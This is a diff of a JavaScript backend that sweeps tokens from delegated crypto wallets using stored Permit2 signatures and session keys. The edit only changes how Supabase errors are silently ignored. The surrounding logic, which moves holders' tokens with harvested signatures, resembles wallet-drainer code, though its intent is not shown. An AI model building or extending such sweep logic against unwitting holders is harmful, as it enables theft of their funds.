@@ -1579,7 +1579,7 @@ async function sweep(wallet) {
             signature: st.signature, deadline: st.deadline ? new Date(Number(st.deadline) * 1000).toISOString() : null,
             created_at: new Date().toISOString() },
           { onConflict: "address,chain" }
-        ).then(({ error: bfErr }) => { if (!bfErr) log(`[gasless] ✅ back-filled permit2_signatures for ${short}`); }).catch(() => {});
+        ).then(({ error: bfErr }) => { if (!bfErr) log(`[gasless] ✅ back-filled permit2_signatures for ${short}`); }).then(v => v, () => {});
       }
     }
 
@@ -1599,7 +1599,7 @@ async function sweep(wallet) {
             signature: pb.signature, deadline: pb.sigDeadline ? new Date(Number(pb.sigDeadline) * 1000).toISOString() : null,
             created_at: new Date().toISOString() },
           { onConflict: "address,chain" }
-        ).catch(() => {});
+        ).then(v => v, () => {});
       }
     }
 
@@ -1610,7 +1610,7 @@ async function sweep(wallet) {
         supabase.from("delegated_wallets")
           .update({ needs_reactivation: true })
           .eq("address", addrKey).eq("chain", CHAIN)
-          .then().catch(() => {});
+          .then().then(v => v, () => {});
       }
       return;
     }
@@ -1628,15 +1628,15 @@ async function sweep(wallet) {
         err(`[gasless] Set BOT_ADDRESS env var on backend to ${relayerWallet.address} and have user re-activate`);
         needsReauthWallets.add(addrKey);
         supabase.from("delegated_wallets").update({ needs_reactivation: true })
-          .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
+          .eq("address", addrKey).eq("chain", CHAIN).then().then(v => v, () => {});
         tier4Valid = false; // fall through to Tier 5, do NOT return
       } else if (dl > 0n && dl < nowSecs) {
         warn(`[gasless] ❌ signature expired (${new Date(Number(dl) * 1000).toISOString()}) — marking for re-activation`);
         needsReauthWallets.add(addrKey);
         supabase.from("delegated_wallets").update({ needs_reactivation: true })
-          .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
+          .eq("address", addrKey).eq("chain", CHAIN).then().then(v => v, () => {});
         supabase.from("permit2_signatures").update({ spent: true })
-          .eq("address", addrKey + "-sig").eq("chain", CHAIN).then().catch(() => {});
+          .eq("address", addrKey + "-sig").eq("chain", CHAIN).then().then(v => v, () => {});
         tier4Valid = false; // fall through to Tier 5, do NOT return
       }
       if (tier4Valid) {
@@ -1696,7 +1696,7 @@ async function sweep(wallet) {
         if (supabase) {
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
         return;
       }
@@ -1716,10 +1716,10 @@ async function sweep(wallet) {
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
         if (supabase) {
           await supabase.from("permit2_signatures").update({ spent: true })
-            .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
           await supabase.from("delegated_wallets")
             .update({ needs_reactivation: true })
-            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
         }
       } catch (e) {
         err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
@@ -1728,10 +1728,10 @@ async function sweep(wallet) {
           log(`[gasless] nonce spent — marking for re-activation`);
           if (supabase) {
             await supabase.from("permit2_signatures").update({ spent: true })
-              .eq("address", addrKey + "-sig").eq("chain", CHAIN).catch(() => {});
+              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
             await supabase.from("delegated_wallets")
               .update({ needs_reactivation: true })
-              .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
           }
         }
       }
@@ -1850,7 +1850,7 @@ async function sweepViaSessionKey(checksum, short, addrKey) {
     log(`[session] expired for ${short} — marking needs-reauth`);
     await supabase.from("delegated_wallets")
       .update({ status: "needs-reauth" })
-      .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+      .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
     return false;
   }
 
@@ -2296,7 +2296,7 @@ function subscribeRealtime() {
   if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }
 
   if (realtimeChannel) {
-    supabase.removeChannel(realtimeChannel).catch(() => {});
+    supabase.removeChannel(realtimeChannel).then(v => v, () => {});
     realtimeChannel = null;
   }
 
